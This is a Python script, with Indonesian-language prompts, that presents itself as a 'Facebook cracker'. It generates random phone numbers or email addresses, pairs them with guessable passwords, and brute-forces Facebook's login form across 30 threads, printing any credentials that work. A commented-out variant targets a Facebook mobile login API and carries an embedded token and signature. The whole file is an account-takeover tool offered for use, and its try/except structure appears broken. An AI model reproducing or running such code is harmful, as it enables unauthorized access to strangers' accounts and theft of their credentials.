#Coded by DulLah (fb.me/dulahz)

import os, re, requests, cookielib, random, mechanize, concurrent.futures
from random import randint
from prettytable import PrettyTable

useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]

def brute(user, passs):
  try:
    # for pw in passs:
    #   params={
    #     'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
    #     'format': 'JSON',
    #     'sdk_version': '2',
    #     'email': user,
    #     'locale': 'en_US',
    #     'password': pw,
    #     'sdk': 'ios',
    #     'generate_session_cookies': '1',
    #     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
    #   }
    #   api='https://b-api.facebook.com/method/auth.login'
    #   response=requests.get(api, params=params)
    #   if re.search('(EAAA)\w+', str(response.text)):
    #     print('  [LIVE] %s -> %s '%(str(user), str(pw)))
    #     break
    #   elif 'www.facebook.com' in response.json()['error_msg']:
    #     print('  [CHEK] %s -> %s '%(str(user), str(pw)))
    #     break
  
  dev = mechanize.Browser()
  cok = cookielib.LWPCookieJar()
  dev.set_handle_robots(False)
  dev.set_handle_redirect(True)
  dev.set_cookiejar(cok)
  dev.set_handle_equiv(True)
  dev.set_handle_referer(True)
  dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
  data = open('word.txt', 'r').readlines()
  lol = 'https://www.facebook.com/login.php?login_attempt=1'
  try:
    for pas in passs:
      print " Mencoba " + pas 
      dev.addheaders = [('User_agent', random.choice(useragents))]
      url = dev.open(lol)
      dev.select_form(nr = 0)
      dev.form['email'] = user
      dev.form['pass'] = pas
      mleb = dev.submit()
      meki = mleb.geturl()
      if meki != lol and (not 'login_attempt' in meki):
        x = PrettyTable()
        print " "
        x.add_column("Username", [user])
        x.add_column("Password", [pas])
        print x
        break

  except: pass

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ]

  Isi nomor awalnya ya kaka
  Harus 5 digit gak boleh kurang dan gak boleh lebih.
  Contoh: 62877
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 5 digit ya kaka ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya kaka ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
  Masukan jumlah nomor yang akan dibuat contoh: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM EMAIL ]

  Isi nama penggunanya ya kaka
  Contoh: putri
  ''')
  nama=input('  Nama pengguna: ')
  domain=input('''
  Pilih domainya kak [G]mail, [Y]ahoo, [H]otmail
  pilih (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Mohon isi yang bener ya kak.') if not domain in ['g','y','h'] else ''
  jml=int(input('''
  Masukan jumlah email yang akan dibuat contoh: 10
  Jumlah: '''))
  setpw=input('''
  Set password yg mendekati nama pengguna
  contoh: putri123,putri1234
  Set password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def pilih():
  print('''
  1. Crack dari nomor random
  2. crack dari email random
  ''')
  pil=int(input('  Pilih mana man?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  Goblokk')
 
pilih() if __name__ == '__main__' else exit('Maaf ada yang error kaka , silahkan coba lagi yahh.')
